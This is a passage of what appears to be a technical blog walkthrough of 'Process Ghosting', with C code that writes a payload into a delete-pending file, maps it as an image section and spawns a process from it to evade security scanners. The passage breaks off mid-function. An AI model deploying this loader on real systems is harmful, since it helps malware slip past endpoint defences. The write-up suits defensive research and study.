+<p>However, as mentioned before, <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex">PsSetCreateProcessNotifyRoutineEx</a> callbacks are registered only when the first thread is spawned, therefore there is a delay between the process creation time vs when the security products are notified of it, providing a window to tamper with the executable and the associated section.</p>
+<h2 id="hot-functions-in-your-area">Hot Functions in your Area</h2>
+<p>There are two functions we need to take a look at -   <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtCreateProcess.html">NtCreateProcess</a>.
+and <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">PsSetCreateProcessNotifyRoutine</a>.</p>
+<p>The function definition of <code>NtCreateProcess()</code> is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSYSAPI 
+</span></span><span style="display:flex;"><span>NTSTATUS
+</span></span><span style="display:flex;"><span>NTAPI
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">NtCreateProcess</span>(
+</span></span><span style="display:flex;"><span>  OUT PHANDLE           _ProcessHandle_,
+</span></span><span style="display:flex;"><span>  IN ACCESS_MASK        _DesiredAccess_,
+</span></span><span style="display:flex;"><span>  IN POBJECT_ATTRIBUTES _ObjectAttributes_ OPTIONAL,
+</span></span><span style="display:flex;"><span>  IN HANDLE             _ParentProcess_,
+</span></span><span style="display:flex;"><span>  IN BOOLEAN            _InheritObjectTable_,
+</span></span><span style="display:flex;"><span>  IN HANDLE             _SectionHandle_ OPTIONAL,
+</span></span><span style="display:flex;"><span>  IN HANDLE             _DebugPort_ OPTIONAL,
+</span></span><span style="display:flex;"><span>  IN HANDLE             _ExceptionPort_ OPTIONAL );
+</span></span></code></pre></div><p>Note how the function takes the handle to a Section, and not a file? This symbolizes that we don&rsquo;t necessarily need a file-on-disk to create a process.</p>
+<p>Next up, look up the definition of <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreateprocessnotifyroutine">PsSetCreateProcessNotifyRoutine</a>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-Cpp" data-lang="Cpp"><span style="display:flex;"><span>NTSTATUS <span style="color:#a6e22e">PsSetCreateProcessNotifyRoutine</span>( [in] PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine, [in] BOOLEAN Remove );
+</span></span></code></pre></div><p>Again, looking up the definition of <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_ps_create_notify_info">PS_CREATE_NOTIFY_INFO</a> structure, we get:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _PS_CREATE_NOTIFY_INFO {
+</span></span><span style="display:flex;"><span>  SIZE_T              Size;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">union</span> {
+</span></span><span style="display:flex;"><span>    ULONG Flags;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> {
+</span></span><span style="display:flex;"><span>      ULONG FileOpenNameAvailable : <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      ULONG IsSubsystemProcess : <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      ULONG Reserved : <span style="color:#ae81ff">30</span>;
+</span></span><span style="display:flex;"><span>    };
+</span></span><span style="display:flex;"><span>  };
+</span></span><span style="display:flex;"><span>  HANDLE              ParentProcessId;
+</span></span><span style="display:flex;"><span>  CLIENT_ID           CreatingThreadId;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">struct</span> _FILE_OBJECT <span style="color:#f92672">*</span>FileObject;
+</span></span><span style="display:flex;"><span>  PCUNICODE_STRING    ImageFileName;
+</span></span><span style="display:flex;"><span>  PCUNICODE_STRING    CommandLine;
+</span></span><span style="display:flex;"><span>  NTSTATUS            CreationStatus;
+</span></span><span style="display:flex;"><span>} PS_CREATE_NOTIFY_INFO, <span style="color:#f92672">*</span>PPS_CREATE_NOTIFY_INFO;
+</span></span></code></pre></div><p>Of interest here is the <code>struct _FILE_OBJECT *FileObject</code> field which is a pointer to the file object for the process executable file. Callback functions can use this to scan the executable on disk for malware. But what if the executable has been deleted&hellip;..?</p>
+<h2 id="boo-a-ghost">Boo! A Ghost! 👻</h2>
+<p>Some of the ways to delete a file include:</p>
+<ul>
+<li>Overwrite it by using the <code>FILE_SUPERSEDED</code> flag with <a href="https://learn.microsoft.com/en-us/windows/win32/api/winternl/nf-winternl-ntcreatefile">NtCreateFile()</a></li>
+<li>Using the <code>CREATE_ALWAYS</code> flag with <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew">CreateFile()</a></li>
+<li>Using <code>FILE_DELETE_ON_CLOSE</code> and <code>FILE_FLAG_DELETE_ON_CLOSE</code>  flag with <a href="https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew">CreateFile()</a></li>
+<li>Set the <code>DeleteFile</code> field in the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/ns-ntddk-_file_disposition_information">FILE_DISPOSITION_INFORMATION</a> structure to <code>TRUE</code> when invoking the <code>FileDispositionInformation</code> file information class via <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntsetinformationfile">NtSetInformationFile()</a></li>
+</ul>
+<p>However, Windows does not like mapped executables being tampered with so it starts throwing off a bunch of errors when we attempt to open it.</p>
+<ul>
+<li>Trying to open the file with <code>NtCreateFile()</code> with the access set to <code>FILE_WRITE_DATA</code>, or via <code>CreateFile()</code> with <code>FILE_DELETE_ON_CLOSE/FILE_FLAG_DELETE_ON_CLOSE</code> flags will result in<code>ERROR_SHARING_VIOLATION</code></li>
+<li>&lsquo;NtSetInformationFile()&rsquo; fails with <code>STATUS_CANNOT_DELETE</code> even when <code>DELETE</code> access right is granted</li>
+<li>Trying to overwrite the file with <code>CREATE_ALWAYS</code> will result in <code>ACCESS_DENIED</code>
+The interesting fact here is that these restrictions come in only when the executable is mapped into an Image Section. This mechanism allows for the following flow:</li>
+</ul>
+<p><img src="/blogs/images/process-ghosting/possible_behaviour.png" alt=""></p>
+<p><code>Process Ghosting</code> follows a similar flow:</p>
+<p><img src="/blogs/images/process-ghosting/pg_flow.png" alt=""></p>
+<h2 id="talk-is-cheap-show-me-the-code">Talk is Cheap, Show me the Code!</h2>
+<p>Time to walk through the code flow for the project! The code is written in C because:</p>
+<ul>
+<li>It helps to understand everything going on at a very fundamental level</li>
+<li>Because I can.</li>
+</ul>
+<p>The <code>main()</code> function takes in two command line arguments:</p>
+<pre tabindex="0"><code>Usage: ghosted.exe &lt;REAL EXE&gt; &lt;FAKE EXE&gt;
+</code></pre><p>The <code>&lt;REAL EXE&gt;</code> takes in the path to an executable on disk which we want to load using <code>Process Ghosting</code> while the <code>&lt;FAKE EXE&gt;</code> is the path where the fake executable will be created before being deleted.</p>
+<h3 id="initial-setup">Initial Setup</h3>
+<p>First, the program checks the correct number of command line arguments. If the number of arguments is correct, the arguments are copied to two variables corresponding to the executable on disk and the file to be created for deletion.</p>
+<p>The program also makes sure that:</p>
+<ul>
+<li>The executable on disk from which the payload is to be read exists and had <code>READ</code> permissions on it</li>
+<li>The executable to be created does not already exist.</li>
+</ul>
+<p>If the checks pass, the program proceeds to call the <code>spawn_process()</code> function with the necessary parameters.</p>
+<h3 id="prepare-target">Prepare Target</h3>
+<p>Next up, we need to create the target fake file where the payload would be written with <code>DELETE</code> permission.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>h_tfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(
+</span></span><span style="display:flex;"><span>	target_exe,
+</span></span><span style="display:flex;"><span>	DELETE <span style="color:#f92672">|</span> SYNCHRONIZE <span style="color:#f92672">|</span> FILE_GENERIC_READ <span style="color:#f92672">|</span> FILE_GENERIC_WRITE ,
+</span></span><span style="display:flex;"><span>	FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>	NULL,
+</span></span><span style="display:flex;"><span>	OPEN_ALWAYS,
+</span></span><span style="display:flex;"><span>	FILE_ATTRIBUTE_NORMAL,
+</span></span><span style="display:flex;"><span>	NULL
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>Next up, we need to put the file in <code>DELETE-PENDING</code> state. We do this via the <code>NtSetInformationFile()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>IO_STATUS_BLOCK io_status;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">RtlZeroMemory</span>(<span style="color:#f92672">&amp;</span>io_status, <span style="color:#66d9ef">sizeof</span>(io_status));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FILE_DISPOSITION_INFORMATION f_fileinfo;
+</span></span><span style="display:flex;"><span>f_fileinfo.DeleteFile <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>FILE_INFORMATION_CLASS f_info <span style="color:#f92672">=</span> FileDispositionInformation;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_status <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtSetInformationFile</span>(
+</span></span><span style="display:flex;"><span>	h_tfile,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&amp;</span>io_status,
+</span></span><span style="display:flex;"><span>	<span style="color:#f92672">&amp;</span>f_fileinfo,
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">sizeof</span>(f_fileinfo),
+</span></span><span style="display:flex;"><span>	f_info);
+</span></span></code></pre></div><p>This code uses the <code>FILE_DISPOSITION_INFORMATION</code> structure with the <code>DeleteFile</code> field set to <code>TRUE</code>. This deletes the file as soon as the handle to the file is closed.</p>
+<p>If the function is successful, the handle to the open file is returned.</p>
+<h3 id="reading-bytes">Reading Bytes</h3>
+<p>Now, we need to read the bytes from the original payload. These bytes can also be fetched from a remote source like a URL or a TCP Stream (future project idea?). We read the bytes from the file as <code>unsigned char</code> and store them on the heap and return a pointer to it. The main code which does this is as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> <span style="color:#a6e22e">read_orig_exe</span>(<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> original_exe) {
+</span></span><span style="display:flex;"><span>	DWORD ho_fsz, lo_fsz;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Open file for reading
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	HANDLE hfile <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(original_exe, GENERIC_READ, <span style="color:#ae81ff">0</span>, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get File Size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	lo_fsz <span style="color:#f92672">=</span> <span style="color:#a6e22e">GetFileSize</span>(hfile, <span style="color:#f92672">&amp;</span>ho_fsz);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Allocate memory
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> s_bytes <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span>)<span style="color:#a6e22e">malloc</span>(lo_fsz);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Read File
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	BOOL result <span style="color:#f92672">=</span> <span style="color:#a6e22e">ReadFile</span>(hfile, s_bytes, lo_fsz, <span style="color:#f92672">&amp;</span>ho_fsz, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CloseHandle</span>(hfile);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> s_bytes;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="create-section-object">Create Section Object</h3>
+<p>Now that we have our target file ready in <em>Delete-Pending</em> stage and the contents we wish to write to it, we first write the payload to it. Then we use the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntcreatesection">NtCreateSection</a> to create a session object for the target file. If there are no errors encountered during this, the handle to the <em>Section Object</em> is returned:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE <span style="color:#a6e22e">fetch_sections</span>(HANDLE hfile, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> f_bytes, DWORD f_size) {
+</span></span><span style="display:flex;"><span>	DWORD _ho_fsz;
+</span></span><span style="display:flex;"><span>	HANDLE hsection <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Write to open handle of the file to be deleted
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	BOOL _res <span style="color:#f92672">=</span> <span style="color:#a6e22e">WriteFile</span>(hfile, (LPCVOID)f_bytes, f_size, <span style="color:#f92672">&amp;</span>_ho_fsz, NULL);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Create section object
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	NTSTATUS _status <span style="color:#f92672">=</span> <span style="color:#a6e22e">NtCreateSection</span>(<span style="color:#f92672">&amp;</span>hsection, SECTION_ALL_ACCESS, NULL, <span style="color:#ae81ff">0</span>, PAGE_READONLY, SEC_IMAGE, hfile);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> hsection;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="getting-entry-point">Getting Entry Point</h3>
+<p><img src="/blogs/images/process-ghosting/header.svg" alt=""></p>
+<p>Next up, we map the file bytes to the <code>Portable Executable</code> format and fetch a pointer to an <code>NT Header</code> structure.</p>
+<p>From that, we get the Relative Address of the PE&rsquo;s entrypoint stored in the optional header.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>DWORD <span style="color:#a6e22e">get_ep_rva</span>(LPVOID <span style="color:#f92672">*</span> base_addr) {
+</span></span><span style="display:flex;"><span>	IMAGE_NT_HEADERS <span style="color:#f92672">*</span> nt_hdr <span style="color:#f92672">=</span> <span style="color:#a6e22e">get_nt_hdr</span>((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)base_addr);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> nt_hdr<span style="color:#f92672">-&gt;</span>OptionalHeader.AddressOfEntryPoint;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Once we have the entry-point offset, we can free the bytes as they are no longer needed, as well as the handle to the target file is closed, thereby deleting it!</p>
+<h3 id="spawn-a-child-process">Spawn A Child Process</h3>
+<p>Now that we have our section handle, we need to create a child process with the Section handle.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>PCP_INFO <span style="color:#a6e22e">create_cp</span>(HANDLE hsection) {
+</span></span><span style="display:flex;"><span>	DWORD retlen <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>	CP_INFO <span style="color:#f92672">*</span> p_info <span style="color:#f92672">=</span> (PCP_INFO)<span style="color:#a6e22e">malloc</span>(<span style="color:#66d9ef">sizeof</span>(CP_INFO));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlZeroMemory</span>(p_info, <span style="color:#66d9ef">sizeof</span>(CP_INFO));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">NtCreateProcess</span>(<span style="color:#f92672">&amp;</span>(p_info<span style="color:#f92672">-&gt;</span>p_handle), PROCESS_ALL_ACCESS, NULL, <span style="color:#a6e22e">GetCurrentProcess</span>(), TRUE, hsection, NULL, NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">NtQueryInformationProcess</span>(p_info<span style="color:#f92672">-&gt;</span>p_handle, ProcessBasicInformation, <span style="color:#f92672">&amp;</span>(p_info<span style="color:#f92672">-&gt;</span>pb_info), <span style="color:#66d9ef">sizeof</span>(PROCESS_BASIC_INFORMATION), NULL);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; Process ID: %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">GetProcessId</span>(p_info<span style="color:#f92672">-&gt;</span>p_handle));
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> p_info;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Here, we create a process using the <a href="http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FProcess%2FNtCreateProcess.html">NtCreateProcess()</a> function and the section handle. The function returns the handle to the Process created plus the <code>PROCESS_BASIC_INFORMATION</code> related to the process in the form of a <code>CP_INFO</code> struct which has the following definition:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">typedef</span> <span style="color:#66d9ef">struct</span> _CP_INFO {
+</span></span><span style="display:flex;"><span>    HANDLE p_handle;
+</span></span><span style="display:flex;"><span>    PROCESS_BASIC_INFORMATION pb_info;
+</span></span><span style="display:flex;"><span>} CP_INFO, <span style="color:#f92672">*</span> PCP_INFO;
+</span></span></code></pre></div><p>Once the child process has been created, we can close the handle to the Section object as it is no longer needed.</p>
+<h3 id="assign-process-arguments-and-environment-variables">Assign process arguments and environment variables</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>BOOL <span style="color:#a6e22e">set_env</span>(PCP_INFO p_info, LPWSTR w_target_name) {
+</span></span><span style="display:flex;"><span>	LPVOID env, param;
+</span></span><span style="display:flex;"><span>	PEB<span style="color:#f92672">*</span> peb_copy <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	UNICODE_STRING u_tpath <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	UNICODE_STRING u_dll_dir <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	UNICODE_STRING u_curr_dir <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">wchar_t</span> w_dir_path[MAX_PATH] <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	UNICODE_STRING u_window_name <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>	PRTL_USER_PROCESS_PARAMETERS proc_params <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Copy Target Paths
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>u_tpath, w_target_name);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Get Current Directory as Wide Chars
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">GetCurrentDirectoryW</span>(MAX_PATH, w_dir_path);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>u_curr_dir, w_dir_path);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Copy DLL Path
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>u_dll_dir, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;C:</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">Windows</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">System32&#34;</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Name of Window
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">RtlInitUnicodeString</span>(<span style="color:#f92672">&amp;</span>u_window_name, <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;db_was_here&#34;</span>);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">// Set Environment
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	env <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">CreateEnvironmentBlock</span>(<span style="color:#f92672">&amp;</span>env, NULL, TRUE);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">RtlCreateProcessParameters</span>(<span style="color:#f92672">&amp;</span>proc_params, (PUNICODE_STRING)<span style="color:#f92672">&amp;</span>u_tpath, (PUNICODE_STRING)<span style="color:#f92672">&amp;</span>u_dll_dir, (PUNICODE_STRING)<span style="color:#f92672">&amp;</span>u_curr_dir, (PUNICODE_STRING)<span style="color:#f92672">&amp;</span>u_tpath, env, (PUNICODE_STRING)<span style="color:#f92672">&amp;</span>u_window_name, NULL, NULL, NULL);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	param <span style="color:#f92672">=</span> <span style="color:#a6e22e">write_params</span>(p_info<span style="color:#f92672">-&gt;</span>p_handle, proc_params);
+</span></span><span style="display:flex;"><span>	peb_copy <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_peb</span>(p_info<span style="color:#f92672">-&gt;</span>p_handle, <span style="color:#f92672">&amp;</span>(p_info<span style="color:#f92672">-&gt;</span>pb_info));
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">write_params_to_peb</span>(param, p_info<span style="color:#f92672">-&gt;</span>p_handle, <span style="color:#f92672">&amp;</span>(p_info<span style="color:#f92672">-&gt;</span>pb_info))
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">free</span>(peb_copy);
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> TRUE;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Before setting assigning process arguments and environment variables, we need to convert our target executable name to a wide-string.</p>
+<p>Then, we need to copy various parameters into <code>UNICODE_STRING</code> structures including Name/Path of the target executable, Current Director, DLL path, and name of the Window.</p>
+<p>Finally, we use the <a href="https://learn.microsoft.com/en-us/windows/win32/api/userenv/nf-userenv-createenvironmentblock">CreateEnvironmentBlock()</a> function to get the environment variables for the specified user.</p>
+<p>With all of this at hand, we can now call the <a href="https://www.freepascal.org/daily/packages/winunits-jedi/jwanative/rtlcreateprocessparameters.html">RtlCreateProcessParameters(</a> function to register our process parameters.</p>
+<p>Now, this is the part where it gets tricky. First, take a look at the <code>write_params()</code> function:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>LPVOID <span style="color:#a6e22e">write_params</span>(HANDLE hprocess, PRTL_USER_PROCESS_PARAMETERS proc_params) {
+</span></span><span style="display:flex;"><span>	PVOID buffer <span style="color:#f92672">=</span> proc_params;
+</span></span><span style="display:flex;"><span>	ULONG_PTR env_end <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>	ULONG_PTR buffer_end <span style="color:#f92672">=</span> (ULONG_PTR)proc_params <span style="color:#f92672">+</span> proc_params<span style="color:#f92672">-&gt;</span>Length;
+</span></span><span style="display:flex;"><span>	SIZE_T buffer_size;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> ((ULONG_PTR)proc_params <span style="color:#f92672">&gt;</span> (ULONG_PTR)proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>			buffer <span style="color:#f92672">=</span> (PVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		env_end <span style="color:#f92672">=</span> (ULONG_PTR)proc_params<span style="color:#f92672">-&gt;</span>Environment <span style="color:#f92672">+</span> proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (env_end <span style="color:#f92672">&gt;</span> buffer_end) {
+</span></span><span style="display:flex;"><span>			buffer_end <span style="color:#f92672">=</span> env_end;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	buffer_size <span style="color:#f92672">=</span> buffer_end <span style="color:#f92672">-</span> (ULONG_PTR)buffer;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, buffer, buffer_size, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, NULL);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, NULL);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> (LPVOID)proc_params;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params, (LPVOID)proc_params, proc_params<span style="color:#f92672">-&gt;</span>Length, NULL);
+</span></span><span style="display:flex;"><span>	
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (proc_params<span style="color:#f92672">-&gt;</span>Environment) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">VirtualAllocEx</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE, PAGE_READWRITE);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">WriteProcessMemory</span>(hprocess, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, (LPVOID)proc_params<span style="color:#f92672">-&gt;</span>Environment, proc_params<span style="color:#f92672">-&gt;</span>EnvironmentSize, NULL);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	
